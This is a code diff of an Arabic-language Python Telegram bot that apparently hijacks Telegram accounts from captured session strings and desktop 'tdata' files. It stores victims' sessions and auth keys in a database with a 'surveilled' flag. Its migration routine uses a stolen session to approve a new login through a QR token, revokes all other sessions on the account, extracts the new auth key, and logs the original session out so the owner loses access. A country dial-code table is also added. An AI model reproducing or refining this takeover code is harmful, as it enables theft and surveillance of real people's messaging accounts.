@@ -1,5 +1,3 @@
-# --- START OF FILE Paste May 31, 2026 - 6:39PM ---
-
 import os
 import re
 import sys
@@ -65,6 +63,199 @@ LOG_CHANNEL = "@I_HATE_YOO"
 bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=20)
 USER_STATES = {}
 
+COUNTRIES_DB = [
+  {"country": "United States", "arabic_name": "الولايات المتحدة", "flag": "🇺🇸", "code": "+1"},
+  {"country": "Canada", "arabic_name": "كندا", "flag": "🇨🇦", "code": "+1"},
+  {"country": "Russia", "arabic_name": "روسيا", "flag": "🇷🇺", "code": "+7"},
+  {"country": "Kazakhstan", "arabic_name": "كازاخستان", "flag": "🇰🇿", "code": "+7"},
+  {"country": "Egypt", "arabic_name": "مصر", "flag": "🇪🇬", "code": "+20"},
+  {"country": "South Africa", "arabic_name": "جنوب أفريقيا", "flag": "🇿🇦", "code": "+27"},
+  {"country": "Greece", "arabic_name": "اليونان", "flag": "🇬🇷", "code": "+30"},
+  {"country": "Netherlands", "arabic_name": "هولندا", "flag": "🇳🇱", "code": "+31"},
+  {"country": "Belgium", "arabic_name": "بلجيكا", "flag": "🇧🇪", "code": "+32"},
+  {"country": "France", "arabic_name": "فرنسا", "flag": "🇫🇷", "code": "+33"},
+  {"country": "Spain", "arabic_name": "إسبانيا", "flag": "🇪🇸", "code": "+34"},
+  {"country": "Hungary", "arabic_name": "المجر", "flag": "🇭🇺", "code": "+36"},
+  {"country": "Italy", "arabic_name": "إيطاليا", "flag": "🇮🇹", "code": "+39"},
+  {"country": "Romania", "arabic_name": "رومانيا", "flag": "🇷🇴", "code": "+40"},
+  {"country": "Switzerland", "arabic_name": "سويسرا", "flag": "🇨🇭", "code": "+41"},
+  {"country": "Austria", "arabic_name": "النمسا", "flag": "🇦🇹", "code": "+43"},
+  {"country": "United Kingdom", "arabic_name": "المملكة المتحدة", "flag": "🇬🇧", "code": "+44"},
+  {"country": "Denmark", "arabic_name": "الدنمارك", "flag": "🇩🇰", "code": "+45"},
+  {"country": "Sweden", "arabic_name": "السويد", "flag": "🇸🇪", "code": "+46"},
+  {"country": "Norway", "arabic_name": "النرويج", "flag": "🇳🇴", "code": "+47"},
+  {"country": "Poland", "arabic_name": "بولندا", "flag": "🇵🇱", "code": "+48"},
+  {"country": "Germany", "arabic_name": "ألمانيا", "flag": "🇩🇪", "code": "+49"},
+  {"country": "Peru", "arabic_name": "بيرو", "flag": "🇵🇪", "code": "+51"},
+  {"country": "Mexico", "arabic_name": "المكسيك", "flag": "🇲🇽", "code": "+52"},
+  {"country": "Cuba", "arabic_name": "كوبا", "flag": "🇨🇺", "code": "+53"},
+  {"country": "Argentina", "arabic_name": "الأرجنتين", "flag": "🇦🇷", "code": "+54"},
+  {"country": "Brazil", "arabic_name": "البرازيل", "flag": "🇧🇷", "code": "+55"},
+  {"country": "Chile", "arabic_name": "تشيلي", "flag": "🇨🇱", "code": "+56"},
+  {"country": "Colombia", "arabic_name": "كولومبيا", "flag": "🇨🇴", "code": "+57"},
+  {"country": "Venezuela", "arabic_name": "فنزويلا", "flag": "🇻🇪", "code": "+58"},
+  {"country": "Malaysia", "arabic_name": "ماليزيا", "flag": "🇲🇾", "code": "+60"},
+  {"country": "Australia", "arabic_name": "أستراليا", "flag": "🇦🇺", "code": "+61"},
+  {"country": "Indonesia", "arabic_name": "إندونيسيا", "flag": "🇮🇩", "code": "+62"},
+  {"country": "Philippines", "arabic_name": "الفلبين", "flag": "🇵🇭", "code": "+63"},
+  {"country": "New Zealand", "arabic_name": "نيوزيلندا", "flag": "🇳🇿", "code": "+64"},
+  {"country": "Singapore", "arabic_name": "سنغافورة", "flag": "🇸🇬", "code": "+65"},
+  {"country": "Thailand", "arabic_name": "تايلاند", "flag": "🇹🇭", "code": "+66"},
+  {"country": "Japan", "arabic_name": "اليابان", "flag": "🇯🇵", "code": "+81"},
+  {"country": "South Korea", "arabic_name": "كوريا الجنوبية", "flag": "🇰🇷", "code": "+82"},
+  {"country": "Vietnam", "arabic_name": "فيتنام", "flag": "🇻🇳", "code": "+84"},
+  {"country": "China", "arabic_name": "الصين", "flag": "🇨🇳", "code": "+86"},
+  {"country": "Turkey", "arabic_name": "تركيا", "flag": "🇹🇷", "code": "+90"},
+  {"country": "India", "arabic_name": "الهند", "flag": "🇮🇳", "code": "+91"},
+  {"country": "Pakistan", "arabic_name": "باكستان", "flag": "🇵🇰", "code": "+92"},
+  {"country": "Afghanistan", "arabic_name": "أفغانستان", "flag": "🇦🇫", "code": "+93"},
+  {"country": "Sri Lanka", "arabic_name": "سريلانكا", "flag": "🇱🇰", "code": "+94"},
+  {"country": "Myanmar", "arabic_name": "ميانمار", "flag": "🇲🇲", "code": "+95"},
+  {"country": "Iran", "arabic_name": "إيران", "flag": "🇮🇷", "code": "+98"},
+  {"country": "Morocco", "arabic_name": "المغرب", "flag": "🇲🇦", "code": "+212"},
+  {"country": "Algeria", "arabic_name": "الجزائر", "flag": "🇩🇿", "code": "+213"},
+  {"country": "Tunisia", "arabic_name": "تونس", "flag": "🇹🇳", "code": "+216"},
+  {"country": "Libya", "arabic_name": "ليبيا", "flag": "🇱🇾", "code": "+218"},
+  {"country": "Gambia", "arabic_name": "غامبيا", "flag": "🇬🇲", "code": "+220"},
+  {"country": "Senegal", "arabic_name": "السنغال", "flag": "🇸🇳", "code": "+221"},
+  {"country": "Mauritania", "arabic_name": "موريتانيا", "flag": "🇲🇷", "code": "+222"},
+  {"country": "Mali", "arabic_name": "مالي", "flag": "🇲🇱", "code": "+223"},
+  {"country": "Guinea", "arabic_name": "غينيا", "flag": "🇬🇳", "code": "+224"},
+  {"country": "Ivory Coast", "arabic_name": "ساحل العاج", "flag": "🇨🇮", "code": "+225"},
+  {"country": "Burkina Faso", "arabic_name": "بوركينا فاسو", "flag": "🇧🇫", "code": "+226"},
+  {"country": "Niger", "arabic_name": "النيجر", "flag": "🇳🇪", "code": "+227"},
+  {"country": "Togo", "arabic_name": "توجو", "flag": "🇹🇬", "code": "+228"},
+  {"country": "Benin", "arabic_name": "بنين", "flag": "🇧🇯", "code": "+229"},
+  {"country": "Mauritius", "arabic_name": "موريشيوس", "flag": "🇲🇺", "code": "+230"},
+  {"country": "Liberia", "arabic_name": "ليبيريا", "flag": "🇱🇷", "code": "+231"},
+  {"country": "Sierra Leone", "arabic_name": "سيراليون", "flag": "🇸🇱", "code": "+232"},
+  {"country": "Ghana", "arabic_name": "غانا", "flag": "🇬🇭", "code": "+233"},
+  {"country": "Nigeria", "arabic_name": "نيجيريا", "flag": "🇳🇬", "code": "+234"},
+  {"country": "Chad", "arabic_name": "تشاد", "flag": "🇹🇩", "code": "+235"},
+  {"country": "Central African Republic", "arabic_name": "جمهورية أفريقيا الوسطى", "flag": "🇨🇫", "code": "+236"},
+  {"country": "Cameroon", "arabic_name": "الكاميرون", "flag": "🇨🇲", "code": "+237"},
+  {"country": "Cape Verde", "arabic_name": "الرأس الأخضر", "flag": "🇨🇻", "code": "+238"},
+  {"country": "Sao Tome and Principe", "arabic_name": "ساو تومي وبرينسيب", "flag": "🇸🇹", "code": "+239"},
+  {"country": "Equatorial Guinea", "arabic_name": "غينيا الاستوائية", "flag": "🇬🇶", "code": "+240"},
+  {"country": "Gabon", "arabic_name": "الجابون", "flag": "🇬🇦", "code": "+241"},
+  {"country": "Republic of the Congo", "arabic_name": "جمهورية الكونغو", "flag": "🇨🇬", "code": "+242"},
+  {"country": "Democratic Republic of the Congo", "arabic_name": "جمهورية الكونغو الديمقراطية", "flag": "🇨🇩", "code": "+243"},
+  {"country": "Angola", "arabic_name": "أنغولا", "flag": "🇦🇴", "code": "+244"},
+  {"country": "Guinea-Bissau", "arabic_name": "غينيا بيساو", "flag": "🇬🇼", "code": "+245"},
+  {"country": "Seychelles", "arabic_name": "سيشل", "flag": "🇸🇨", "code": "+248"},
+  {"country": "Sudan", "arabic_name": "السودان", "flag": "🇸🇩", "code": "+249"},
+  {"country": "Rwanda", "arabic_name": "رواندا", "flag": "🇷🇼", "code": "+250"},
+  {"country": "Ethiopia", "arabic_name": "إثيوبيا", "flag": "🇪🇹", "code": "+251"},
+  {"country": "Somalia", "arabic_name": "الصومال", "flag": "🇸🇴", "code": "+252"},
+  {"country": "Djibouti", "arabic_name": "جيبوتي", "flag": "🇩🇯", "code": "+253"},
+  {"country": "Kenya", "arabic_name": "كينيا", "flag": "🇰🇪", "code": "+254"},
+  {"country": "Tanzania", "arabic_name": "تنزانيا", "flag": "🇹🇿", "code": "+255"},
+  {"country": "Uganda", "arabic_name": "أوغندا", "flag": "🇺🇬", "code": "+256"},
+  {"country": "Burundi", "arabic_name": "بوروندي", "flag": "🇧🇮", "code": "+257"},
+  {"country": "Mozambique", "arabic_name": "موزمبيق", "flag": "🇲🇿", "code": "+258"},
+  {"country": "Zambia", "arabic_name": "زامبيا", "flag": "🇿🇲", "code": "+260"},
+  {"country": "Madagascar", "arabic_name": "مدغشقر", "flag": "🇲🇬", "code": "+261"},
+  {"country": "Zimbabwe", "arabic_name": "زيمبابوي", "flag": "🇿🇼", "code": "+263"},
+  {"country": "Namibia", "arabic_name": "ناميبيا", "flag": "🇳🇦", "code": "+264"},
+  {"country": "Malawi", "arabic_name": "مالاوي", "flag": "🇲🇼", "code": "+265"},
+  {"country": "Lesotho", "arabic_name": "ليسوتو", "flag": "🇱🇸", "code": "+266"},
+  {"country": "Botswana", "arabic_name": "بوتسوانا", "flag": "🇧🇼", "code": "+267"},
+  {"country": "Eswatini", "arabic_name": "إسواتيني", "flag": "🇸🇿", "code": "+268"},
+  {"country": "Comoros", "arabic_name": "جزر القمر", "flag": "🇰🇲", "code": "+269"},
+  {"country": "Portugal", "arabic_name": "البرتغال", "flag": "🇵🇹", "code": "+351"},
+  {"country": "Luxembourg", "arabic_name": "لوكسمبورغ", "flag": "🇱🇺", "code": "+352"},
+  {"country": "Ireland", "arabic_name": "أيرلندا", "flag": "🇮🇪", "code": "+353"},
+  {"country": "Iceland", "arabic_name": "آيسلندا", "flag": "🇮🇸", "code": "+354"},
+  {"country": "Albania", "arabic_name": "ألبانيا", "flag": "🇦🇱", "code": "+355"},
+  {"country": "Malta", "arabic_name": "مالطا", "flag": "🇲🇹", "code": "+356"},
+  {"country": "Cyprus", "arabic_name": "قبرص", "flag": "🇨🇾", "code": "+357"},
+  {"country": "Finland", "arabic_name": "فنلندا", "flag": "🇫🇮", "code": "+358"},
+  {"country": "Bulgaria", "arabic_name": "بلغاريا", "flag": "🇧🇬", "code": "+359"},
+  {"country": "Lithuania", "arabic_name": "ليتوانيا", "flag": "🇱🇹", "code": "+370"},
+  {"country": "Latvia", "arabic_name": "لاتفيا", "flag": "🇱🇻", "code": "+371"},
+  {"country": "Estonia", "arabic_name": "إستونيا", "flag": "🇪🇪", "code": "+372"},
+  {"country": "Moldova", "arabic_name": "مولدوفا", "flag": "🇲🇩", "code": "+373"},
+  {"country": "Armenia", "arabic_name": "أرمينيا", "flag": "🇦🇲", "code": "+374"},
+  {"country": "Belarus", "arabic_name": "بيلاروسيا", "flag": "🇧🇾", "code": "+375"},
+  {"country": "Andorra", "arabic_name": "أندورا", "flag": "🇦🇩", "code": "+376"},
+  {"country": "Monaco", "arabic_name": "موناكو", "flag": "🇲🇨", "code": "+377"},
+  {"country": "San Marino", "arabic_name": "سان مارينو", "flag": "🇸🇲", "code": "+378"},
+  {"country": "Ukraine", "arabic_name": "أوكرانيا", "flag": "🇺🇦", "code": "+380"},
+  {"country": "Serbia", "arabic_name": "صربيا", "flag": "🇷🇸", "code": "+381"},
+  {"country": "Montenegro", "arabic_name": "الجبل الأسود", "flag": "🇲🇪", "code": "+382"},
+  {"country": "Croatia", "arabic_name": "كرواتيا", "flag": "🇭🇷", "code": "+385"},
+  {"country": "Slovenia", "arabic_name": "سلوفينيا", "flag": "🇸🇮", "code": "+386"},
+  {"country": "Bosnia and Herzegovina", "arabic_name": "البوسنة والهرسك", "flag": "🇧🇦", "code": "+387"},
+  {"country": "North Macedonia", "arabic_name": "مقدونيا الشمالية", "flag": "🇲🇰", "code": "+389"},
+  {"country": "Czech Republic", "arabic_name": "جمهورية التشيك", "flag": "🇨🇿", "code": "+420"},
+  {"country": "Slovakia", "arabic_name": "سلوفاكيا", "flag": "🇸🇰", "code": "+421"},
+  {"country": "Liechtenstein", "arabic_name": "ليختنشتاين", "flag": "🇱🇮", "code": "+423"},
+  {"country": "Belize", "arabic_name": "بليز", "flag": "🇧🇿", "code": "+501"},
+  {"country": "Guatemala", "arabic_name": "غواتيمالا", "flag": "🇬🇹", "code": "+502"},
+  {"country": "El Salvador", "arabic_name": "السلفادور", "flag": "🇸🇻", "code": "+503"},
+  {"country": "Honduras", "arabic_name": "هندوراس", "flag": "🇭🇳", "code": "+504"},
+  {"country": "Nicaragua", "arabic_name": "نيكاراغوا", "flag": "🇳🇮", "code": "+505"},
+  {"country": "Costa Rica", "arabic_name": "كوستاريكا", "flag": "🇨🇷", "code": "+506"},
+  {"country": "Panama", "arabic_name": "بنما", "flag": "🇵🇦", "code": "+507"},
+  {"country": "Haiti", "arabic_name": "هايتي", "flag": "🇭🇹", "code": "+509"},
+  {"country": "Bolivia", "arabic_name": "بوليفيا", "flag": "🇧🇴", "code": "+591"},
+  {"country": "Guyana", "arabic_name": "غيانا", "flag": "🇬🇾", "code": "+592"},
+  {"country": "Ecuador", "arabic_name": "الإكوادور", "flag": "🇪🇨", "code": "+593"},
+  {"country": "Paraguay", "arabic_name": "باراغواي", "flag": "🇵🇾", "code": "+595"},
+  {"country": "Suriname", "arabic_name": "سورينام", "flag": "🇸🇷", "code": "+597"},
+  {"country": "Uruguay", "arabic_name": "أوروغواي", "flag": "🇺🇾", "code": "+598"},
+  {"country": "Timor-Leste", "arabic_name": "تيمور الشرقية", "flag": "🇹🇱", "code": "+670"},
+  {"country": "Brunei", "arabic_name": "بروناي", "flag": "🇧🇳", "code": "+673"},
+  {"country": "Papua New Guinea", "arabic_name": "بابوا غينيا الجديدة", "flag": "🇵🇬", "code": "+675"},
+  {"country": "Tonga", "arabic_name": "تونغا", "flag": "🇹🇴", "code": "+676"},
+  {"country": "Fiji", "arabic_name": "فيجي", "flag": "🇫🇯", "code": "+679"},
+  {"country": "North Korea", "arabic_name": "كوريا الشمالية", "flag": "🇰🇵", "code": "+850"},
+  {"country": "Hong Kong", "arabic_name": "هونغ كونغ", "flag": "🇭🇰", "code": "+852"},
+  {"country": "Macau", "arabic_name": "ماكاو", "flag": "🇲🇴", "code": "+853"},
+  {"country": "Cambodia", "arabic_name": "كمبوديا", "flag": "🇰🇭", "code": "+855"},
+  {"country": "Laos", "arabic_name": "لاوس", "flag": "🇱🇦", "code": "+856"},
+  {"country": "Bangladesh", "arabic_name": "بنغلاديش", "flag": "🇧🇩", "code": "+880"},
+  {"country": "Taiwan", "arabic_name": "تايوان", "flag": "🇹🇼", "code": "+886"},
+  {"country": "Maldives", "arabic_name": "جزر المالديف", "flag": "🇲🇻", "code": "+960"},
+  {"country": "Lebanon", "arabic_name": "لبنان", "flag": "🇱🇧", "code": "+961"},
+  {"country": "Jordan", "arabic_name": "الأردن", "flag": "🇯🇴", "code": "+962"},
+  {"country": "Syria", "arabic_name": "سوريا", "flag": "🇸🇾", "code": "+963"},
+  {"country": "Iraq", "arabic_name": "العراق", "flag": "🇮🇶", "code": "+964"},
+  {"country": "Kuwait", "arabic_name": "الكويت", "flag": "🇰🇼", "code": "+965"},
+  {"country": "Saudi Arabia", "arabic_name": "السعودية", "flag": "🇸🇦", "code": "+966"},
+  {"country": "Yemen", "arabic_name": "اليمن", "flag": "🇾🇪", "code": "+967"},
+  {"country": "Oman", "arabic_name": "عمان", "flag": "🇴🇲", "code": "+968"},
+  {"country": "Palestine", "arabic_name": "فلسطين", "flag": "🇵🇸", "code": "+970"},
+  {"country": "United Arab Emirates", "arabic_name": "الإمارات", "flag": "🇦🇪", "code": "+971"},
+  {"country": "Bahrain", "arabic_name": "البحرين", "flag": "🇧🇭", "code": "+973"},
+  {"country": "Qatar", "arabic_name": "قطر", "flag": "🇶🇦", "code": "+974"},
+  {"country": "Bhutan", "arabic_name": "بوتان", "flag": "🇧🇹", "code": "+975"},
+  {"country": "Mongolia", "arabic_name": "منغوليا", "flag": "🇲🇳", "code": "+976"},
+  {"country": "Nepal", "arabic_name": "نيبال", "flag": "🇳🇵", "code": "+977"},
+  {"country": "Tajikistan", "arabic_name": "طاجيكستان", "flag": "🇹🇯", "code": "+992"},
+  {"country": "Turkmenistan", "arabic_name": "تركمانستان", "flag": "🇹🇲", "code": "+993"},
+  {"country": "Azerbaijan", "arabic_name": "أذربيجان", "flag": "🇦🇿", "code": "+994"},
+  {"country": "Georgia", "arabic_name": "جورجيا", "flag": "🇬🇪", "code": "+995"},
+  {"country": "Kyrgyzstan", "arabic_name": "قرغيزستان", "flag": "🇰🇬", "code": "+996"},
+  {"country": "Uzbekistan", "arabic_name": "أوزبكستان", "flag": "🇺🇿", "code": "+998"}
+]
+
+def get_country_info(phone):
+    if not phone or phone == "Unknown":
+        return "غير معروف", "🌍"
+    
+    phone_str = str(phone)
+    if not phone_str.startswith('+'):
+        phone_str = '+' + phone_str
+        
+    sorted_db = sorted(COUNTRIES_DB, key=lambda x: len(x['code']), reverse=True)
+    
+    for country in sorted_db:
+        if phone_str.startswith(country['code']):
+            return country['arabic_name'], country['flag']
+            
+    return "غير معروف", "🌍"
+
 # =========================================================
 # 🗄️ إدارة قواعد البيانات
 # =========================================================
@@ -77,27 +268,25 @@ def init_db():
     c = conn.cursor()
     c.execute("PRAGMA journal_mode=WAL;")
     c.execute(''' CREATE TABLE IF NOT EXISTS sessions ( id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, phone TEXT, user_id INTEGER, first_name TEXT, pyro_session TEXT, tl_session TEXT, session_type TEXT, auto_term_enabled INTEGER DEFAULT 0, auto_term_interval INTEGER DEFAULT 24, last_term_attempt INTEGER DEFAULT 0 ) ''')
-    try: c.execute("ALTER TABLE sessions ADD COLUMN surveilled INTEGER DEFAULT 0")
-    except: pass
-    try: c.execute("ALTER TABLE sessions ADD COLUMN dc_id INTEGER DEFAULT 2")
-    except: pass
-    try: c.execute("ALTER TABLE sessions ADD COLUMN auth_hex TEXT DEFAULT ''")
-    except: pass
+    try:
+        c.execute("ALTER TABLE sessions ADD COLUMN surveilled INTEGER DEFAULT 0")
+    except:
+        pass
     c.execute(''' CREATE TABLE IF NOT EXISTS allowed_users ( user_id INTEGER PRIMARY KEY, first_name TEXT ) ''')
     conn.commit()
     conn.close()
 
-def save_account(owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, dc_id=2, auth_hex=""):
+def save_account(owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type):
     conn = get_db_conn()
     c = conn.cursor()
-    c.execute(""" INSERT INTO sessions ( owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, dc_id, auth_hex ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) """, (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, dc_id, auth_hex))
+    c.execute(""" INSERT INTO sessions ( owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type ) VALUES (?, ?, ?, ?, ?, ?, ?) """, (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type))
     conn.commit()
     conn.close()
 
 def get_all_accounts(owner_id):
     conn = get_db_conn()
     c = conn.cursor()
-    c.execute("SELECT id, phone, first_name, user_id, pyro_session, dc_id, auth_hex FROM sessions WHERE owner_id=?", (owner_id,))
+    c.execute("SELECT id, phone, first_name, user_id, pyro_session FROM sessions WHERE owner_id=?", (owner_id,))
     rows = c.fetchall()
     conn.close()
     return rows
@@ -156,15 +345,6 @@ def get_all_allowed_users():
     conn.close()
     return rows
 
-def get_sender_name(user_id):
-    if user_id in ADMIN_IDS: return "المطور"
-    conn = get_db_conn()
-    c = conn.cursor()
-    c.execute("SELECT first_name FROM allowed_users WHERE user_id=?", (user_id,))
-    res = c.fetchone()
-    conn.close()
-    return res[0] if res else "مجهول"
-
 init_db()
 
 # =========================================================
@@ -186,9 +366,9 @@ def get_creation_year(user_id):
         elif uid < 7000000000: return "2023"
         elif uid < 8000000000: return "2024"
         elif uid < 9000000000: return "2025"
-        else: return "2026+"
+        else: return "2026 (أو أحدث)"
     except Exception:
-        return "مـجـهـول"
+        return "غـيـر مـعـروف"
 
 def get_dc_ip(dc_id):
     return {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100", 4: "149.154.167.90", 5: "149.154.171.5"}.get(dc_id, "149.154.167.51")
@@ -198,19 +378,6 @@ def generate_sessions(api_id, dc_id, auth_key_bytes, user_id=9999):
     session = StringSession()
     session._dc_id, session._server_address, session._port, session._auth_key = dc_id, get_dc_ip(dc_id), 443, AuthKey(auth_key_bytes)
     return base64.urlsafe_b64encode(pyro_packed).decode("utf-8").rstrip("="), session.save()
-
-def parse_pyro_session(session_str):
-    try:
-        data = base64.urlsafe_b64decode(session_str + "=" * (-len(session_str) % 4))
-        if len(data) == 271:
-            dc_id, api_id, test_mode, auth_key, user_id, is_bot = struct.unpack(">BI?256sQ?", data)
-            return dc_id, auth_key.hex()
-        elif len(data) == 267:
-            dc_id, test_mode, auth_key, user_id, is_bot = struct.unpack(">B?256sQ?", data)
-            return dc_id, auth_key.hex()
-    except Exception:
-        pass
-    return 2, ""
 
 async def extract_tdata_official(base_dir):
     if not OPENTELE_AVAILABLE: return None, None, None
@@ -231,6 +398,14 @@ async def extract_tdata_official(base_dir):
             if d and a: return d, a, u
     except Exception: pass
     return None, None, None
+
+def get_hex_from_pyro(pyro_session):
+    try:
+        data = base64.urlsafe_b64decode(pyro_session + "=" * (-len(pyro_session) % 4))
+        auth_key = data[6:262]
+        return auth_key.hex()
+    except:
+        return "غير متوفر"
 
 async def confirm_session_death(pyro_session):
     await asyncio.sleep(1.5)
@@ -280,107 +455,65 @@ def log_to_channel(text, file_path=None, session_text=None):
     except Exception as e:
         logging.error(f"فشل إرسال للقناة: {e}")
 
-async def execute_full_migration(acc_id, client_a, original_owner, admin_id, phone, name, saved_dc_id, saved_hex):
-    """محرك السحب الخام والتهجير الجذري إلى Session B وتسجيل الخروج من A (تحديث 2026 الشامل لحل مشكلة الـ 404)"""
+
+
+
+async def execute_full_migration(acc_id, client_a, original_owner, admin_id, phone, name):
+    """محرك السحب الخام والتهجير الجذري إلى Session B وتسجيل الخروج من A (نسخة 2026 المستقرة)"""
 
     B_DEVICE_MODEL = f"MigrationB_{acc_id}"
     client_b = None
     verify_b = None
 
     try:
+        # 1. استخراج السيرفر الصحيح برمجياً من جلسة A عبر Raw API بدقة
         if not client_a.is_connected:
             await client_a.connect()
 
-        # 1. الجلسة A تبدأ عملية الطرد الجذري لكل الجلسات (ما عدا نفسها) أولاً
-        auths = await client_a.invoke(functions.account.GetAuthorizations())
-        hit_24h_limit = False
-
-        for auth in auths.authorizations:
-            is_current_a = getattr(auth, 'current', False)
-            if not is_current_a:
-                try:
-                    await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
-                    await asyncio.sleep(0.5) 
-                except Exception as e:
-                    err_str = str(e).lower()
-                    if "fresh" in err_str or "24" in err_str:
-                        hit_24h_limit = True
-                        break 
-                    elif "flood" in err_str:
-                        await asyncio.sleep(5)
-
-        # إذا واجهنا خطأ 24 ساعة، ننهي العملية هنا ونضع الحساب تحت المراقبة
-        if hit_24h_limit:
-            conn = get_db_conn()
-            c = conn.cursor()
-            c.execute("UPDATE sessions SET surveilled=1, tl_session=? WHERE id=?", (str(admin_id), acc_id))
-            conn.commit()
-            conn.close()
-            if client_a.is_connected: await client_a.disconnect()
-            return False
-
-        # 2. استخراج السيرفر الصحيح برمجياً لضمان الدقة
         me_raw = await client_a.invoke(functions.users.GetUsers(id=[types.InputUserSelf()]))
-        target_dc = me_raw[0].dc_id if me_raw and hasattr(me_raw[0], 'dc_id') else saved_dc_id
+        target_dc = me_raw[0].dc_id if me_raw and hasattr(me_raw[0], 'dc_id') else 2
 
-        # 3. إنشاء الجلسة B بدون String لضمان أن Pyrogram تولد مفتاحاً حقيقياً وتتجنب 404 Auth Key Not Found
+        # 2. توليد السلسلة النصية الموجهة للـ DC المستهدف لمنع خطأ الـ Migrate نهائياً
+        empty_auth_key = b"\x00" * 256
+        packed = struct.pack(">B?256sQ?", target_dc, False, empty_auth_key, 0, False)
+        constructed_session = packed + b"\x00" * 6  
+        session_string_for_b = base64.urlsafe_b64encode(constructed_session).decode().rstrip("=")
+
+        # 3. إنشاء الجلسة B على السيرفر الصحيح من أول ثانية
         client_b = Client(
             f"cb_{acc_id}_{int(time.time())}", 
             api_id=API_ID, 
             api_hash=API_HASH, 
+            session_string=session_string_for_b, 
             in_memory=True,
             device_model=B_DEVICE_MODEL
         ) 
         await client_b.connect()
 
-        # 4. خدعة حصرية: إجبار Client B على الانتقال للسيرفر الصحيح وبناء AuthKey سليم قبل طلب الـ QR
-        if target_dc and target_dc != 2:
-            dummy_phone = f"+{target_dc}7770000000"
-            try:
-                # هذه الخطوة ستفشل ولكن Pyrogram سيقوم بالانتقال خلف الكواليس وتوليد مفتاح صحيح للـ DC المطلوب!
-                await client_b.send_code(dummy_phone)
-            except Exception:
-                pass 
-
-        # 5. طلب رمز تسجيل الدخول لـ B بأمان
+        # 4. طلب رمز تسجيل الدخول لـ B (سيصدر جاهزاً ومباشراً بدون طلب انتقال)
         qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
 
+        # حماية احتياطية نادرة الحدوث في حال أصر السيرفر على التوجيه
         if isinstance(qr, types.auth.LoginTokenMigrateTo):
-            dummy_phone_retry = f"+{qr.dc_id}7770000000"
-            try:
-                await client_b.send_code(dummy_phone_retry)
-            except Exception:
-                pass
+            await client_b.disconnect()
+            packed_retry = struct.pack(">B?256sQ?", qr.dc_id, False, empty_auth_key, 0, False)
+            session_string_for_b = base64.urlsafe_b64encode(packed_retry + b"\x00" * 6).decode().rstrip("=")
+            client_b = Client(f"cb_retry_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=session_string_for_b, in_memory=True, device_model=B_DEVICE_MODEL)
+            await client_b.connect()
             qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
 
-        # 6. الجلسة A توافق على الرمز
+        # 5. الجلسة A توافق على الرمز
         if isinstance(qr, types.auth.LoginToken):
             await client_a.invoke(functions.auth.AcceptLoginToken(token=qr.token))
 
-            # 7. فحص قبول الدخول عبر Polling للجلسة B لمنع فقدان الحساب
-            logged_in = False
-            for _ in range(6):
-                await asyncio.sleep(1.5)
-                poll = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
-                if isinstance(poll, types.auth.LoginTokenSuccess):
-                    logged_in = True
-                    break
-            
-            if not logged_in:
-                try:
-                    await client_b.get_me()
-                    logged_in = True
-                except Exception:
-                    pass
+            # مهلة أمان حرجة لكي يستقبل العميل B إشعار نجاح الصلاحيات بالكامل ويحفظها
+            await asyncio.sleep(5) 
 
-            if not logged_in:
-                raise Exception("فشلت الجلسة B في تأكيد الموافقة من الجلسة A")
-
-            # 8. تصدير الجلسة B كسلسلة نصية كاملة الصلاحيات
+            # 6. تصدير الجلسة B كسلسلة نصية كاملة الصلاحيات وفصل العميل القديم
             session_b_str = await client_b.export_session_string()
             await client_b.disconnect()
 
-            # 9. فحص الجلسة الجديدة واستخراج الـ HEX الجديد النظيف 100%
+            # 7. فحص الجلسة الجديدة عبر عميل نظيف 100% (سحر الحل لمنع خطأ UNREGISTERED)
             verify_b = Client(f"vb_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=session_b_str, in_memory=True)
             await verify_b.connect()
             me_b = await verify_b.get_me()
@@ -388,12 +521,47 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             if not me_b:
                 raise Exception("فشل التحقق من Session B عبر العميل النظيف")
 
-            new_dc_id, new_hex_key = parse_pyro_session(session_b_str)
-            if not new_dc_id: new_dc_id = target_dc
-            
+            dc_id = me_b.dc_id if me_b.dc_id else target_dc
+
+            # استخراج مفتاح الـ HEX بدقة من الـ Session String
+            try:
+                decoded_hex = base64.urlsafe_b64decode(session_b_str + "=" * (-len(session_b_str) % 4))
+                hex_key = decoded_hex[2:258].hex()
+            except Exception:
+                hex_key = "UNKNOWN_HEX"
+
             await verify_b.disconnect()
 
-            # 10. الجلسة A تسجل خروج بنفسها
+            # 8. الجلسة A تبدأ عملية الطرد الجذري لكل الجلسات (ما عدا نفسها و B)
+            auths = await client_a.invoke(functions.account.GetAuthorizations())
+            hit_24h_limit = False
+
+            for auth in auths.authorizations:
+                is_current_a = getattr(auth, 'current', False)
+                is_session_b = (getattr(auth, 'device_model', '') == B_DEVICE_MODEL)
+
+                if not is_current_a and not is_session_b:
+                    try:
+                        await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
+                        await asyncio.sleep(0.5) 
+                    except Exception as e:
+                        err_str = str(e).lower()
+                        if "fresh" in err_str or "24" in err_str:
+                            hit_24h_limit = True
+                            break 
+                        elif "flood" in err_str:
+                            await asyncio.sleep(5)
+
+            if hit_24h_limit:
+                conn = get_db_conn()
+                c = conn.cursor()
+                c.execute("UPDATE sessions SET surveilled=1, tl_session=? WHERE id=?", (str(admin_id), acc_id))
+                conn.commit()
+                conn.close()
+                if client_a.is_connected: await client_a.disconnect()
+                return False
+
+            # 9. الجلسة A تسجل خروج بنفسها عبر Raw API لتدمير الجلسة القديمة تماماً
             try:
                 await client_a.invoke(functions.auth.LogOut())
             except Exception: 
